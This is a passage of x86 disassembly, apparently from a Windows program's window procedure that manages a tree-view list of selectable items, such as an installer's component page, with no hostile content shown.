  4048f6:	50                   	push   %eax
  4048f7:	6a 00                	push   $0x0
  4048f9:	68 00 11 00 00       	push   $0x1100
  4048fe:	ff 75 fc             	push   -0x4(%ebp)
  404901:	ff d6                	call   *%esi
  404903:	8b 0d d4 9f 42 00    	mov    0x429fd4,%ecx
  404909:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  40490c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40490f:	47                   	inc    %edi
  404910:	81 c2 18 04 00 00    	add    $0x418,%edx
  404916:	3b 3d 8c eb 42 00    	cmp    0x42eb8c,%edi
  40491c:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40491f:	0f 8c 4b ff ff ff    	jl     0x404870
  404925:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404929:	75 19                	jne    0x404944
  40492b:	6a f0                	push   $0xfffffff0
  40492d:	ff 75 fc             	push   -0x4(%ebp)
  404930:	ff 15 90 71 40 00    	call   *0x407190
  404936:	24 fb                	and    $0xfb,%al
  404938:	50                   	push   %eax
  404939:	6a f0                	push   $0xfffffff0
  40493b:	ff 75 fc             	push   -0x4(%ebp)
  40493e:	ff 15 30 72 40 00    	call   *0x407230
  404944:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404948:	75 18                	jne    0x404962
  40494a:	6a 05                	push   $0x5
  40494c:	ff 75 f8             	push   -0x8(%ebp)
  40494f:	ff 15 60 72 40 00    	call   *0x407260
  404955:	ff 75 f8             	push   -0x8(%ebp)
  404958:	e8 96 f4 ff ff       	call   0x403df3
  40495d:	e9 83 03 00 00       	jmp    0x404ce5
  404962:	ff 75 fc             	push   -0x4(%ebp)
  404965:	e8 89 f4 ff ff       	call   0x403df3
  40496a:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  40496d:	33 ff                	xor    %edi,%edi
  40496f:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404976:	75 12                	jne    0x40498a
  404978:	33 c9                	xor    %ecx,%ecx
  40497a:	89 7d 10             	mov    %edi,0x10(%ebp)
  40497d:	41                   	inc    %ecx
  40497e:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404985:	89 4d 14             	mov    %ecx,0x14(%ebp)
  404988:	eb 03                	jmp    0x40498d
  40498a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40498d:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404991:	b8 13 04 00 00       	mov    $0x413,%eax
  404996:	74 09                	je     0x4049a1
  404998:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40499b:	0f 85 e7 00 00 00    	jne    0x404a88
  4049a1:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4049a4:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4049a7:	74 0d                	je     0x4049b6
  4049a9:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  4049b0:	0f 85 d2 00 00 00    	jne    0x404a88
  4049b6:	f6 05 79 eb 42 00 02 	testb  $0x2,0x42eb79
  4049bd:	75 76                	jne    0x404a35
  4049bf:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4049c2:	74 09                	je     0x4049cd
  4049c4:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4049c7:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  4049cb:	75 68                	jne    0x404a35
  4049cd:	33 c9                	xor    %ecx,%ecx
  4049cf:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4049d2:	0f 95 c1             	setne  %cl
  4049d5:	51                   	push   %ecx
  4049d6:	ff 75 fc             	push   -0x4(%ebp)
  4049d9:	e8 9b fc ff ff       	call   0x404679
  4049de:	3b c7                	cmp    %edi,%eax
  4049e0:	7c 53                	jl     0x404a35
  4049e2:	8b c8                	mov    %eax,%ecx
  4049e4:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4049ea:	8d 54 19 08          	lea    0x8(%ecx,%ebx,1),%edx
  4049ee:	8b 0a                	mov    (%edx),%ecx
  4049f0:	f6 c1 10             	test   $0x10,%cl
  4049f3:	75 40                	jne    0x404a35
  4049f5:	f6 c1 40             	test   $0x40,%cl
  4049f8:	74 14                	je     0x404a0e
  4049fa:	81 f1 80 00 00 00    	xor    $0x80,%ecx
  404a00:	84 c9                	test   %cl,%cl
  404a02:	79 05                	jns    0x404a09
  404a04:	83 c9 01             	or     $0x1,%ecx
  404a07:	eb 08                	jmp    0x404a11
  404a09:	83 e1 fe             	and    $0xfffffffe,%ecx
  404a0c:	eb 03                	jmp    0x404a11
  404a0e:	83 f1 01             	xor    $0x1,%ecx
  404a11:	50                   	push   %eax
  404a12:	89 0a                	mov    %ecx,(%edx)
  404a14:	e8 64 c7 ff ff       	call   0x40117d
  404a19:	a1 78 eb 42 00       	mov    0x42eb78,%eax
  404a1e:	33 c9                	xor    %ecx,%ecx
  404a20:	f7 d0                	not    %eax
  404a22:	41                   	inc    %ecx
  404a23:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404a2a:	c1 e8 08             	shr    $0x8,%eax
  404a2d:	23 c1                	and    %ecx,%eax
  404a2f:	89 4d 10             	mov    %ecx,0x10(%ebp)
  404a32:	89 45 14             	mov    %eax,0x14(%ebp)
  404a35:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  404a38:	74 4e                	je     0x404a88
  404a3a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404a3d:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  404a44:	75 0e                	jne    0x404a54
  404a46:	ff 70 5c             	push   0x5c(%eax)
  404a49:	57                   	push   %edi
  404a4a:	68 19 04 00 00       	push   $0x419
  404a4f:	ff 75 fc             	push   -0x4(%ebp)
  404a52:	ff d6                	call   *%esi
  404a54:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404a57:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  404a5e:	75 28                	jne    0x404a88
  404a60:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404a64:	75 12                	jne    0x404a78
  404a66:	8b 40 5c             	mov    0x5c(%eax),%eax
  404a69:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404a6f:	8d 44 18 08          	lea    0x8(%eax,%ebx,1),%eax
  404a73:	83 08 20             	orl    $0x20,(%eax)
  404a76:	eb 10                	jmp    0x404a88
  404a78:	8b 40 5c             	mov    0x5c(%eax),%eax
  404a7b:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404a81:	8d 5c 18 08          	lea    0x8(%eax,%ebx,1),%ebx
  404a85:	83 23 df             	andl   $0xffffffdf,(%ebx)
  404a88:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404a8f:	75 72                	jne    0x404b03
  404a91:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404a97:	0f 85 48 02 00 00    	jne    0x404ce5
  404a9d:	8b 45 10             	mov    0x10(%ebp),%eax
  404aa0:	c1 e8 10             	shr    $0x10,%eax
  404aa3:	66 3d 01 00          	cmp    $0x1,%ax
  404aa7:	0f 85 38 02 00 00    	jne    0x404ce5
  404aad:	57                   	push   %edi
  404aae:	57                   	push   %edi
  404aaf:	68 47 01 00 00       	push   $0x147
  404ab4:	ff 75 f8             	push   -0x8(%ebp)
  404ab7:	ff d6                	call   *%esi
  404ab9:	83 f8 ff             	cmp    $0xffffffff,%eax
  404abc:	0f 84 23 02 00 00    	je     0x404ce5
  404ac2:	57                   	push   %edi
  404ac3:	50                   	push   %eax
  404ac4:	68 50 01 00 00       	push   $0x150
  404ac9:	ff 75 f8             	push   -0x8(%ebp)
  404acc:	ff d6                	call   *%esi
  404ace:	8b d8                	mov    %eax,%ebx
  404ad0:	83 fb ff             	cmp    $0xffffffff,%ebx
  404ad3:	74 08                	je     0x404add
  404ad5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404ad8:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  404adb:	75 03                	jne    0x404ae0
  404add:	6a 20                	push   $0x20
  404adf:	5b                   	pop    %ebx
  404ae0:	53                   	push   %ebx
  404ae1:	e8 b3 c7 ff ff       	call   0x401299
  404ae6:	53                   	push   %ebx
  404ae7:	57                   	push   %edi
  404ae8:	68 20 04 00 00       	push   $0x420
  404aed:	ff 75 08             	push   0x8(%ebp)
  404af0:	ff d6                	call   *%esi
  404af2:	c7 45 10 01 00 00 00 	movl   $0x1,0x10(%ebp)
  404af9:	89 7d 14             	mov    %edi,0x14(%ebp)
  404afc:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404b03:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404b0a:	75 0c                	jne    0x404b18
  404b0c:	57                   	push   %edi
  404b0d:	57                   	push   %edi
  404b0e:	68 00 02 00 00       	push   $0x200
  404b13:	ff 75 fc             	push   -0x4(%ebp)
  404b16:	ff d6                	call   *%esi
  404b18:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404b1f:	75 32                	jne    0x404b53
  404b21:	a1 bc 9f 42 00       	mov    0x429fbc,%eax
  404b26:	3b c7                	cmp    %edi,%eax
  404b28:	74 07                	je     0x404b31
  404b2a:	50                   	push   %eax
  404b2b:	ff 15 2c 70 40 00    	call   *0x40702c
  404b31:	a1 d4 9f 42 00       	mov    0x429fd4,%eax
  404b36:	3b c7                	cmp    %edi,%eax
  404b38:	74 07                	je     0x404b41
  404b3a:	50                   	push   %eax
  404b3b:	ff 15 fc 70 40 00    	call   *0x4070fc
  404b41:	89 3d bc 9f 42 00    	mov    %edi,0x429fbc
  404b47:	89 3d d4 9f 42 00    	mov    %edi,0x429fd4
  404b4d:	89 3d c0 eb 42 00    	mov    %edi,0x42ebc0
  404b53:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404b5a:	0f 85 47 01 00 00    	jne    0x404ca7
  404b60:	57                   	push   %edi
  404b61:	57                   	push   %edi
  404b62:	e8 88 c6 ff ff       	call   0x4011ef
  404b67:	39 7d 10             	cmp    %edi,0x10(%ebp)
  404b6a:	74 07                	je     0x404b73
  404b6c:	6a 08                	push   $0x8
  404b6e:	e8 98 c8 ff ff       	call   0x40140b
  404b73:	39 7d 14             	cmp    %edi,0x14(%ebp)
  404b76:	74 3f                	je     0x404bb7
  404b78:	ff 35 d4 9f 42 00    	push   0x429fd4
  404b7e:	e8 5f c7 ff ff       	call   0x4012e2
  404b83:	8b d8                	mov    %eax,%ebx
  404b85:	53                   	push   %ebx
  404b86:	e8 0e c7 ff ff       	call   0x401299
  404b8b:	33 c0                	xor    %eax,%eax
  404b8d:	33 c9                	xor    %ecx,%ecx
  404b8f:	3b df                	cmp    %edi,%ebx
  404b91:	7e 0e                	jle    0x404ba1
  404b93:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404b96:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  404b99:	74 01                	je     0x404b9c
  404b9b:	41                   	inc    %ecx
  404b9c:	40                   	inc    %eax
  404b9d:	3b c3                	cmp    %ebx,%eax
  404b9f:	7c f2                	jl     0x404b93
  404ba1:	57                   	push   %edi
  404ba2:	51                   	push   %ecx
  404ba3:	68 4e 01 00 00       	push   $0x14e
  404ba8:	ff 75 f8             	push   -0x8(%ebp)
  404bab:	ff d6                	call   *%esi
  404bad:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404bb0:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404bb7:	57                   	push   %edi
  404bb8:	57                   	push   %edi
  404bb9:	e8 31 c6 ff ff       	call   0x4011ef
  404bbe:	a1 d4 9f 42 00       	mov    0x429fd4,%eax
  404bc3:	39 3d 8c eb 42 00    	cmp    %edi,0x42eb8c
  404bc9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404bcc:	a1 88 eb 42 00       	mov    0x42eb88,%eax
  404bd1:	c7 45 c8 30 f0 00 00 	movl   $0xf030,-0x38(%ebp)
  404bd8:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404bdb:	0f 8e 9c 00 00 00    	jle    0x404c7d
  404be1:	8d 58 08             	lea    0x8(%eax),%ebx
  404be4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404be7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404bea:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404bed:	3b c7                	cmp    %edi,%eax
  404bef:	74 74                	je     0x404c65
  404bf1:	8b 0b                	mov    (%ebx),%ecx
  404bf3:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404bf6:	f6 c5 01             	test   $0x1,%ch
  404bf9:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  404c00:	74 11                	je     0x404c13
  404c02:	8d 43 10             	lea    0x10(%ebx),%eax
  404c05:	c7 45 bc 09 00 00 00 	movl   $0x9,-0x44(%ebp)
  404c0c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404c0f:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  404c13:	f6 c1 40             	test   $0x40,%cl
  404c16:	74 05                	je     0x404c1d
  404c18:	6a 03                	push   $0x3
  404c1a:	58                   	pop    %eax
  404c1b:	eb 0e                	jmp    0x404c2b
  404c1d:	8b c1                	mov    %ecx,%eax
  404c1f:	83 e0 01             	and    $0x1,%eax
  404c22:	40                   	inc    %eax
  404c23:	f6 c1 10             	test   $0x10,%cl
  404c26:	74 03                	je     0x404c2b
  404c28:	83 c0 03             	add    $0x3,%eax
  404c2b:	8b d1                	mov    %ecx,%edx
  404c2d:	ff 75 c0             	push   -0x40(%ebp)
  404c30:	c1 e0 0b             	shl    $0xb,%eax
  404c33:	83 e2 08             	and    $0x8,%edx
  404c36:	0b c2                	or     %edx,%eax
  404c38:	8b d1                	mov    %ecx,%edx
  404c3a:	c1 f9 05             	sar    $0x5,%ecx
  404c3d:	03 c0                	add    %eax,%eax
  404c3f:	83 e2 20             	and    $0x20,%edx
  404c42:	83 e1 01             	and    $0x1,%ecx
  404c45:	0b c2                	or     %edx,%eax
  404c47:	41                   	inc    %ecx
  404c48:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404c4b:	51                   	push   %ecx
  404c4c:	68 02 11 00 00       	push   $0x1102
  404c51:	ff 75 fc             	push   -0x4(%ebp)
  404c54:	ff d6                	call   *%esi
  404c56:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404c59:	50                   	push   %eax
  404c5a:	57                   	push   %edi
  404c5b:	68 0d 11 00 00       	push   $0x110d
  404c60:	ff 75 fc             	push   -0x4(%ebp)
  404c63:	ff d6                	call   *%esi
  404c65:	ff 45 f4             	incl   -0xc(%ebp)
  404c68:	81 c3 18 04 00 00    	add    $0x418,%ebx
  404c6e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404c71:	3b 05 8c eb 42 00    	cmp    0x42eb8c,%eax
  404c77:	0f 8c 67 ff ff ff    	jl     0x404be4
  404c7d:	6a 01                	push   $0x1
  404c7f:	57                   	push   %edi
  404c80:	ff 75 fc             	push   -0x4(%ebp)
  404c83:	ff 15 40 72 40 00    	call   *0x407240
  404c89:	a1 3c e3 42 00       	mov    0x42e33c,%eax
  404c8e:	39 78 10             	cmp    %edi,0x10(%eax)
  404c91:	74 14                	je     0x404ca7
  404c93:	6a 05                	push   $0x5
  404c95:	e8 b2 f9 ff ff       	call   0x40464c
  404c9a:	50                   	push   %eax
  404c9b:	6a fb                	push   $0xfffffffb
  404c9d:	68 ff 03 00 00       	push   $0x3ff
  404ca2:	e8 f0 f8 ff ff       	call   0x404597
  404ca7:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  404cae:	75 35                	jne    0x404ce5
  404cb0:	f6 05 79 eb 42 00 01 	testb  $0x1,0x42eb79
  404cb7:	74 2c                	je     0x404ce5
  404cb9:	33 c0                	xor    %eax,%eax
  404cbb:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404cbf:	8b 35 60 72 40 00    	mov    0x407260,%esi
  404cc5:	0f 94 c0             	sete   %al
  404cc8:	c1 e0 03             	shl    $0x3,%eax
  404ccb:	8b f8                	mov    %eax,%edi
  404ccd:	57                   	push   %edi
  404cce:	ff 75 fc             	push   -0x4(%ebp)
  404cd1:	ff d6                	call   *%esi
  404cd3:	57                   	push   %edi
  404cd4:	68 fe 03 00 00       	push   $0x3fe
  404cd9:	ff 75 08             	push   0x8(%ebp)
  404cdc:	ff 15 2c 72 40 00    	call   *0x40722c
  404ce2:	50                   	push   %eax
  404ce3:	ff d6                	call   *%esi
  404ce5:	ff 75 14             	push   0x14(%ebp)
  404ce8:	ff 75 10             	push   0x10(%ebp)
  404ceb:	ff 75 0c             	push   0xc(%ebp)
  404cee:	e8 32 f1 ff ff       	call   0x403e25
  404cf3:	5f                   	pop    %edi
  404cf4:	5e                   	pop    %esi
  404cf5:	5b                   	pop    %ebx
  404cf6:	c9                   	leave
  404cf7:	c2 10 00             	ret    $0x10
  404cfa:	55                   	push   %ebp
  404cfb:	8b ec                	mov    %esp,%ebp
  404cfd:	81 7d 0c 02 01 00 00 	cmpl   $0x102,0xc(%ebp)
  404d04:	53                   	push   %ebx
  404d05:	56                   	push   %esi
  404d06:	75 17                	jne    0x404d1f
  404d08:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  404d0c:	75 7d                	jne    0x404d8b
  404d0e:	68 13 04 00 00       	push   $0x413
  404d13:	e8 f2 f0 ff ff       	call   0x403e0a
  404d18:	33 c0                	xor    %eax,%eax
